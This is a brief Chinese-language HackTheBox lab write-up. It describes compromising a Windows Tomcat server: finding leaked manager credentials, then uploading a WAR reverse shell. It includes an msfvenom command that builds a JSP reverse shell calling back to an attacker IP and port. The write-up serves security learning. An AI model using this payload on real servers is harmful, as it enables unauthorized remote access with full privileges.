---
UID: 20250621133736
aliases: 
tags:
  - 靶场
  - 打靶
  - windows
  - hackthebox
source: 
cssclasses: 
created: 2025-06-21
---
![image.png](https://s2.loli.net/2025/06/21/vePFNrjIm3ZEw6c.png)

## 端口扫描
![image.png](https://s2.loli.net/2025/06/21/Qav2lDAfLwF3mKB.png)

只有一个 8080 端口

## web 服务信息收集
这是个 tomcat，看看有什么能利用的漏洞吗
![image.png](https://s2.loli.net/2025/06/21/jrzUlyF5DMda3Ye.png)

点击 manager app 可以发现要输入账密。随便输点东西就会爆出账密
![image.png](https://s2.loli.net/2025/06/21/5JmEYzDXckyZupC.png)

## 上传反弹 shell
进入管理界面，我们可以考虑一波。上传 war 的反弹 shell
![image.png](https://s2.loli.net/2025/06/21/5KMGpnQujBCt2sX.png)

用 msfvennom 制作木马
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.12 LPORT=8888 -f war -o shell.war
```

![image.png](https://s2.loli.net/2025/06/21/byXCckwUJi7PNML.png)


![image.png](https://s2.loli.net/2025/06/21/HFIcts9KQuqU3pf.png)

反弹 shell 成功

![image.png](https://s2.loli.net/2025/06/21/fyAKjGzdN1VMETx.png)

还是最高权限的用户

## 找 flag
![image.png](https://s2.loli.net/2025/06/21/Jq9puZfNOUDBkgL.png)



